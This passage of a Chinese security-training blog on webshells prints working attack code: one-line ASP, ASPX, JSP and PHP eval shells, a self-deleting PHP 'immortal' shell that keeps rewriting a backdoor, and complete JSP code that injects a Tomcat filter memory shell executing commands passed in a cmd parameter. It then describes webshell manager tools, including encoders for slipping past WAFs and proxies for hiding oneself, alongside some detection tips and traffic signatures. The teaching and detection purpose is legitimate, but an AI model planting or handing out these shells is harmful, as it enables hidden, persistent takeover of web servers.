class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;% execute(request(&quot;value&quot;)) %&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"aspx\"><a href=\"#aspx\" class=\"headerlink\" title=\"aspx\"></a>aspx</h3><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; %&gt; &lt;% eval(Request.Item[&quot;value&quot;]) %&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"jsp\"><a href=\"#jsp\" class=\"headerlink\" title=\"jsp\"></a>jsp</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span>(request.getParameter(<span class=\"string\">&quot;f&quot;</span>)!=<span class=\"literal\">null</span>)(<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.FileOutputStream(application.getRealPath(<span class=\"string\">&quot;\\\\&quot;</span>)+request.getParameter(<span class=\"string\">&quot;f&quot;</span>))).write(request.getParameter(<span class=\"string\">&quot;t&quot;</span>).getBytes());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"WebShell管理工具\"><a href=\"#WebShell管理工具\" class=\"headerlink\" title=\"WebShell管理工具\"></a>WebShell管理工具</h2><p>Cknife 中国菜刀</p>\n<p>antSword 中国蚁剑</p>\n<p>冰蝎 动态二进制加密网站管理客户端</p>\n<p>weevely3</p>\n<p>Altman</p>\n<p>Webshell Sniper</p>\n<p>Quasibot</p>\n<p>哥斯拉</p>\n<h2 id=\"WebShell的原理\"><a href=\"#WebShell的原理\" class=\"headerlink\" title=\"WebShell的原理\"></a>WebShell的原理</h2><p>在线php环境</p>\n<p><a href=\"https://c.runoob.com/compile/1/\">https://c.runoob.com/compile/1/</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[value]); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$x</span> = <span class=\"variable\">$_POST</span>[value];  <span class=\"comment\">//post传参给变量x</span></span><br><span class=\"line\">@<span class=\"keyword\">eval</span>(<span class=\"variable\">$x</span>);   <span class=\"comment\">//@可以阻止这些报错提示信息显示到界面上  eval是一个函数，把字符串当成 PHP 代码来计算</span></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span> </span><br><span class=\"line\"><span class=\"comment\">//可以调用php的一些执行命令的函数去执行攻击者想要的操作</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;whoami&#x27;</span>);  <span class=\"comment\">//system()函数将命令作为参数，并输出结果。</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$x</span> = <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"string\">&#x27;uname -a&#x27;</span>);  <span class=\"comment\">//system()函数将命令作为参数，并输出结果。</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$x</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$x</span> = <span class=\"title function_ invoke__\">exec</span>(<span class=\"string\">&#x27;uname -a&#x27;</span>);  <span class=\"comment\">//system()函数将命令作为参数，并输出结果。</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$x</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<p>PHP中一些执行shell命令最常用的函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">system</span>()函数将命令作为参数，并输出结果。</span><br><span class=\"line\"><span class=\"title function_ invoke__\">exec</span>()功能是将命令作为参数，但不输出结果。</span><br><span class=\"line\"><span class=\"title function_ invoke__\">shell_exec</span>()函数类似于<span class=\"title function_ invoke__\">exec</span>()，但是，其整个输出结果为字符串。</span><br><span class=\"line\"><span class=\"title function_ invoke__\">passthru</span>()执行一个命令并返回原始格式的输出。</span><br><span class=\"line\"><span class=\"title function_ invoke__\">proc_open</span>()函数可能很难理解。简单地说，我们可以使用<span class=\"title function_ invoke__\">proc_open</span>()，创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"内存马\"><a href=\"#内存马\" class=\"headerlink\" title=\"内存马\"></a>内存马</h2><p><a href=\"https://mp.weixin.qq.com/s/1gbqITFThA1qJ-u7iyu2bQ\">https://mp.weixin.qq.com/s/1gbqITFThA1qJ-u7iyu2bQ</a></p>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>经过近几年护网演练各种攻防对抗的开展，各个厂商对于传统的webshell文件都有很强的检测模型及检测技术，而内存马却不容易被检测到，本次小编整理了各类内存Webshell工具的使用方法和各类内存Webshell的识别方法。以便大家可以更加了解内存马的原理，而且如果真的不幸被植入内存马，也能更及时的解决。</p>\n<h3 id=\"内存Webshell简介\"><a href=\"#内存Webshell简介\" class=\"headerlink\" title=\"内存Webshell简介\"></a>内存Webshell简介</h3><p>内存webshell相比于常规webshell更容易躲避传统安全监测设备的检测，通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>\n<h3 id=\"内存webshell原理\"><a href=\"#内存webshell原理\" class=\"headerlink\" title=\"内存webshell原理\"></a>内存webshell原理</h3><p>其原理是先由客户端发起一个web请求，中间件的各个独立的组件如Listener、Filter、Servlet等组件会在请求过程中做监听、判断、过滤等操作，内存马利用请求过程在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode达到持久化的控制服务器。</p>\n<p><img src=\"_416gyL0T5Lzitj7S9RqNqp3w-NB1J0Re5zu-r2q6xg.png\" alt=\"image\"></p>\n<h3 id=\"php内存马\"><a href=\"#php内存马\" class=\"headerlink\" title=\"php内存马\"></a>php内存马</h3><p>php内存马也就是php不死马是将不死马启动后删除本身，在内存中执行死循环，使管理员无法删除木马文件。本次演示是将php不死马放到web目录下访问后及执行会在本地循环生成php一句话木马。</p>\n<p><strong>检测思路：</strong></p>\n<ol>\n<li>检查所有php进程处理请求的持续时间</li>\n<li>检测执行文件是否在文件系统真实存在</li>\n</ol>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ignore_user_abort</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unlink</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"string\">&#x27;&lt;?php @eval($_POST[&quot;zxc&quot;]) ?&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;bsm22.php&quot;</span>, <span class=\"variable\">$content</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">usleep</span>(<span class=\"number\">10000</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>函数说明</strong>：  </p>\n<ol>\n<li>ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行，如果设置为 true，则忽略与用户的断开。</li>\n<li>set_time_limit()函数：设置允许脚本运行的时间，单位为秒。如果设置为0（零），没有时间方面的限制。</li>\n<li>unlink(__FILE__)函数：删除文件。</li>\n<li>file_put_contents函数：将一个字符串写入文件。</li>\n<li>usleep函数：延迟执行当前脚本若干微秒（一微秒等于一百万分之一秒）。</li>\n</ol>\n<p>实战</p>\n<p>1.将php不死马放到web目录下</p>\n<p>2.访问代码执行成功并生成后门</p>\n<p>3.执行完生成php一句话木马</p>\n<p>4.查看phpinfo</p>\n<p>5.对于不死马，直接删除脚本是没有用的，因为php执行的时候已经把脚本读进去解释成opcode运行了。使用条件竞争写入同名文件进行克制不死马。</p>\n<p>删除：</p>\n<p>将usleep改为小于php不死马的参数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">set_time_limit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">ignore_user_abort</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unlink</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\"><span class=\"variable\">$content</span> = <span class=\"string\">&#x27;xxx&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;bsm22.php&quot;</span>, <span class=\"variable\">$content</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">usleep</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"Java内存马\"><a href=\"#Java内存马\" class=\"headerlink\" title=\"Java内存马\"></a>Java内存马</h3><h4 id=\"filter型内存马原理\"><a href=\"#filter型内存马原理\" class=\"headerlink\" title=\"filter型内存马原理\"></a>filter型内存马原理</h4><p>    Filter：FIlter为过滤器可以对用户的一些请求进行拦截修改等操作。当web.xml中注册了一个Filter来对某个 Servlet 程序进行拦截处理时该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息进行修改。filter型内存马是将命令执行的文件通过动态注册成一个恶意的filter，这个filter没有落地文件并可以让客户端发来的请求通过它来做命令执行。</p>\n<p><img src=\"VU2QhvQOTIIAyik7idTIyiHi99gDx9_a0MpRDEdo8c8.png\" alt=\"image\"></p>\n<p>web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter，当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法。在doFilter方法中，开发人员如果调用了FilterChain对象的doFilter方法，则web服务器会检查FilterChain对象中是否还有filter，如果有，则调用第2个filter，如果没有，则调用目标资源。</p>\n<p><strong>filter检测思路</strong>：</p>\n<ol>\n<li>带有特殊含义的filter的名字比如shell等。</li>\n<li>Filter的优先级，filter内存马需要将filter调至最高</li>\n<li>查看web.xml中有没有filter配置</li>\n<li>检测特殊的classloader</li>\n<li>检测classloader路径下没有class文件</li>\n<li>检测Filter中的doFilter方法是否有恶意代码</li>\n</ol>\n<p><strong>filter内存马实战</strong>：</p>\n<p>    这里我们将公开的filter类型的内存马文件直接上传到tomcat网站下，访问内存马后就植入成功了，植入成功后在删掉相对的jsp文件也不会影响内存马的运行，但是重启tomcat服务器后内存马即失效。注入成功后在路径后加入?cmd&#x3D;后跟命令即可。</p>\n<p>内存马代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page contentType=<span class=\"string\">&quot;text/html;charset=UTF-8&quot;</span> language=<span class=\"string\">&quot;java&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- tomcat <span class=\"number\">8</span>/<span class=\"number\">9</span> --&gt;</span><br><span class=\"line\">&lt;!-- &lt;%<span class=\"meta\">@page</span> <span class=\"keyword\">import</span> = <span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>%&gt;</span><br><span class=\"line\">&lt;%<span class=\"meta\">@page</span> <span class=\"keyword\">import</span> = <span class=\"string\">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>%&gt; --&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- tomcat <span class=\"number\">7</span> --&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%@ <span class=\"type\">page</span> <span class=\"variable\">import</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">filterDemo</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Filter</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">init</span><span class=\"params\">(FilterConfig filterConfig)</span> <span class=\"keyword\">throws</span> ServletException &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">doFilter</span><span class=\"params\">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class=\"keyword\">throws</span> IOException, ServletException &#123;</span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">cmd</span> <span class=\"operator\">=</span> servletRequest.getParameter(<span class=\"string\">&quot;cmd&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (cmd!= <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\"><span class=\"type\">Process</span> <span class=\"variable\">process</span> <span class=\"operator\">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class=\"line\">java.io.<span class=\"type\">BufferedReader</span> <span class=\"variable\">bufferedReader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.BufferedReader(</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class=\"line\"><span class=\"type\">StringBuilder</span> <span class=\"variable\">stringBuilder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">String line;</span><br><span class=\"line\"><span class=\"keyword\">while</span> ((line = bufferedReader.readLine()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">stringBuilder.append(line + <span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class=\"line\">servletResponse.getOutputStream().flush();</span><br><span class=\"line\">servletResponse.getOutputStream().close();</span><br><span class=\"line\"><span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">filterChain.doFilter(servletRequest, servletResponse);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">destroy</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"comment\">//从org.apache.catalina.core.ApplicationContext反射获取context方法</span></span><br><span class=\"line\"><span class=\"type\">ServletContext</span> <span class=\"variable\">servletContext</span> <span class=\"operator\">=</span>  request.getSession().getServletContext();</span><br><span class=\"line\"><span class=\"type\">Field</span> <span class=\"variable\">appctx</span> <span class=\"operator\">=</span> servletContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">appctx.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">ApplicationContext</span> <span class=\"variable\">applicationContext</span> <span class=\"operator\">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"><span class=\"type\">Field</span> <span class=\"variable\">stdctx</span> <span class=\"operator\">=</span> applicationContext.getClass().getDeclaredField(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">stdctx.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">StandardContext</span> <span class=\"variable\">standardContext</span> <span class=\"operator\">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"><span class=\"type\">Field</span> <span class=\"variable\">Configs</span> <span class=\"operator\">=</span> standardContext.getClass().getDeclaredField(<span class=\"string\">&quot;filterConfigs&quot;</span>);</span><br><span class=\"line\">Configs.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">Map</span> <span class=\"variable\">filterConfigs</span> <span class=\"operator\">=</span> (Map) Configs.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">name</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;filterDemo&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//判断是否存在filterDemo1这个filter，如果没有则准备创建</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (filterConfigs.get(name) == <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\"><span class=\"comment\">//定义一些基础属性、类名、filter名等</span></span><br><span class=\"line\"><span class=\"type\">filterDemo</span> <span class=\"variable\">filter</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">filterDemo</span>();</span><br><span class=\"line\"><span class=\"type\">FilterDef</span> <span class=\"variable\">filterDef</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FilterDef</span>();</span><br><span class=\"line\">filterDef.setFilterName(name);</span><br><span class=\"line\">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\">filterDef.setFilter(filter);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//添加filterDef</span></span><br><span class=\"line\">standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//创建filterMap，设置filter和url的映射关系,可设置成单一url如/zzz ,也可以所有页面都可触发可设置为/*</span></span><br><span class=\"line\"><span class=\"type\">FilterMap</span> <span class=\"variable\">filterMap</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FilterMap</span>();</span><br><span class=\"line\"><span class=\"comment\">// filterMap.addURLPattern(&quot;/*&quot;);</span></span><br><span class=\"line\">filterMap.addURLPattern(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\">filterMap.setFilterName(name);</span><br><span class=\"line\">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//添加我们的filterMap到所有filter最前面</span></span><br><span class=\"line\">standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//反射创建FilterConfig，传入standardContext与filterDef</span></span><br><span class=\"line\"><span class=\"type\">Constructor</span> <span class=\"variable\">constructor</span> <span class=\"operator\">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class=\"line\">constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\"><span class=\"type\">ApplicationFilterConfig</span> <span class=\"variable\">filterConfig</span> <span class=\"operator\">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//将filter名和配置好的filterConifg传入</span></span><br><span class=\"line\">filterConfigs.put(name,filterConfig);</span><br><span class=\"line\">out.write(<span class=\"string\">&quot;Inject success!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">out.write(<span class=\"string\">&quot;Injected!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n<p>tomcat启动</p>\n<p>C:\\Users\\hp\\Desktop\\apache-tomcat-9.0.62\\bin</p>\n<p>web目录</p>\n<p>C:\\Users\\hp\\Desktop\\apache-tomcat-9.0.62\\webapps\\ROOT</p>\n<p><img src=\"S6fOVzVdKGBe7GvpYwfiKLxvpciGWUB9SNycBy_qvKk.png\" alt=\"image\"></p>\n<p><img src=\"mMzXCiKQ-Jx99dr6p06Y3APTB_nMNhqPeH4fZrmtKQo.png\" alt=\"image\"></p>\n","categories":["原创培训课件"],"tags":["内存马"]},{"title":"day6-webshell详解二（下午：webshell管理工具）","url":"/2022/08/16/day6-webshell%E8%AF%A6%E8%A7%A3%E4%BA%8C%EF%BC%88%E4%B8%8B%E5%8D%88%EF%BC%9Awebshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%EF%BC%89/","content":"<h1 id=\"day6-webshell详解二（下午：webshell管理工具）\"><a href=\"#day6-webshell详解二（下午：webshell管理工具）\" class=\"headerlink\" title=\"day6-webshell详解二（下午：webshell管理工具）\"></a>day6-webshell详解二（下午：webshell管理工具）</h1><h2 id><a href=\"#\" class=\"headerlink\" title></a></h2><h2 id=\"各种管理工具的使用\"><a href=\"#各种管理工具的使用\" class=\"headerlink\" title=\"各种管理工具的使用\"></a>各种管理工具的使用</h2><h3 id=\"中国菜刀\"><a href=\"#中国菜刀\" class=\"headerlink\" title=\"中国菜刀\"></a>中国菜刀</h3><p>这里的中国菜刀不是指切菜做饭的工具,而是中国黑客圈内使用非常广泛的一款Webshel。中国菜刀是一款功能强大的webshell工具，可以用来对目标网站进行渗透获取目标系统的文件系统，对目标系统的文件系统进行管理同时也可以对获取系统的shell进行操作命令执行操作，同时可以对目标系统进行数据库操作，</p>\n<h3 id=\"中国蚁剑\"><a href=\"#中国蚁剑\" class=\"headerlink\" title=\"中国蚁剑\"></a>中国蚁剑</h3><h4 id=\"使用教程\"><a href=\"#使用教程\" class=\"headerlink\" title=\"使用教程\"></a>使用教程</h4><p><a href=\"https://www.yuque.com/antswordproject/antsword\">https://www.yuque.com/antswordproject/antsword</a></p>\n<h4 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。中国蚁剑采用了Electron作为外壳，ES6作为前端代码编写语言，搭配Babel&amp;&amp;Webpack进行组件化构建编译，外加 iconv-lite编码解码模块以及superagent数据发送处理模块还有nedb数据存储模块，组成了这个年轻而又充满活力的新一代大杀器。</p>\n<h4 id=\"组成\"><a href=\"#组成\" class=\"headerlink\" title=\"组成\"></a>组成</h4><p>蚁剑分为两部分，一部分是加载器，就是界面<strong>，</strong>一个是项目核心源码</p>\n<p>加载器：<a href=\"https://github.com/AntSwordProject/AntSword-Loader\">https://github.com/AntSwordProject/AntSword-Loader</a></p>\n<p>核心源码：<a href=\"https://github.com/AntSwordProject/AntSword.git\">https://github.com/AntSwordProject/AntSword.git</a></p>\n<h4 id=\"代理设置\"><a href=\"#代理设置\" class=\"headerlink\" title=\"代理设置\"></a>代理设置</h4><p>AntSword 自 v.1.1.2 版本起内置了代理功能，默认「不使用代理」，你可以根据自己的网络情况，设置使用代理连接Shell。</p>\n<p><img src=\"ZevY55mQgTYWA_7pIlamZsTMtFeTF3kDu96D6qBgrPc.png\" alt=\"image\"></p>\n<p><img src=\"PSDLGTxk-7ls1ZkNcgxGBQhknpJYnWil6Kh8CLv17ZE.png\" alt=\"image\"></p>\n<h5 id=\"代理有什么用？\"><a href=\"#代理有什么用？\" class=\"headerlink\" title=\"代理有什么用？\"></a>代理有什么用？</h5><ul>\n<li>连接处于内网中的Shell</li>\n<li>加快连接速度</li>\n<li>隐藏自身</li>\n<li>与 BurpSuite 等工具配合使用</li>\n</ul>\n<h4 id=\"Shell-管理\"><a href=\"#Shell-管理\" class=\"headerlink\" title=\"Shell 管理\"></a>Shell 管理</h4><p><img src=\"UZyNIPMWpwwu9nT22ezKqIeOvOFmr_X44A0ux_KKpio.png\" alt=\"image\"></p>\n<p>● 编码器</p>\n<p>编码器用于蚁剑客户端与 Shell 通信时的加密、编码操作，是蚁剑一大核心功能。</p>\n<p>灵活使用编码器功能，在连接防火墙后的服务端时有奇效</p>\n<p>● default(默认)</p>\n<p>通信过程不采编码与加密操作，明文传输（不推荐，特殊字符会被转义导致出错）</p>\n<p>● random(随机编码器, 不推荐 已废弃) </p>\n<p>通信过程中在当前 Shell 类型支持的编码器中随机选取一种进行通信编码</p>\n<p>● base64</p>\n<p>通信时使用 base64 编码对通信数据进行编码操作（不推荐，已被WAF作为特征）</p>\n<p>● chr</p>\n<p>PHP 类型独有，通信时使用 chr 函数对传输的字符串进行处理拼接（推荐）</p>\n<p>● hex</p>\n<p>ASPX, CUSTOM 类独有，将通信数据字符转成16进制数据传输（推荐）</p>\n<h4 id=\"文件管理\"><a href=\"#文件管理\" class=\"headerlink\" title=\"文件管理\"></a>文件管理</h4><h4 id=\"虚拟终端\"><a href=\"#虚拟终端\" class=\"headerlink\" title=\"虚拟终端\"></a>虚拟终端</h4><h4 id=\"数据库管理\"><a href=\"#数据库管理\" class=\"headerlink\" title=\"数据库管理\"></a>数据库管理</h4><h4 id=\"插件市场\"><a href=\"#插件市场\" class=\"headerlink\" title=\"插件市场\"></a>插件市场</h4><p><img src=\"JcoBJEc7H49SI1RGpiOOlpEMptHr7ZNq8AIV6--QxFg.png\" alt=\"image\"></p>\n<h4 id=\"流量特征分析\"><a href=\"#流量特征分析\" class=\"headerlink\" title=\"流量特征分析\"></a>流量特征分析</h4><p>1.将蚁剑的正文内容进行URL解码后，流量最中明显的特征为@ini_set(“display_errors”,”0”);</p>\n<p>2.这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文。</p>\n<p>3.蚁剑使用加密的时候有eval这种明显的特征。如：rot13、chr16、base64、chr</p>\n<p>4.$oparr、$opdir参数名，参数名加密数据后的数据包也可识别为蚁剑的流量特征。</p>\n<h3 id=\"冰蝎3-0\"><a href=\"#冰蝎3-0\" class=\"headerlink\" title=\"冰蝎3.0\"></a>冰蝎3.0</h3><h4 id=\"介绍：\"><a href=\"#介绍：\" class=\"headerlink\" title=\"介绍：\"></a>介绍：</h4><p>冰蝎是一款基于Java开发的动态加密通信流量的新型Webshell客户端。老牌 Webshell 管理神器——中国菜刀的攻击流量特征明显，容易被各类安全设备检测，实际场景中越来越少使用，加密 Webshell 正变得日趋流行。由于通信流量被加密，传统的 WAF、IDS 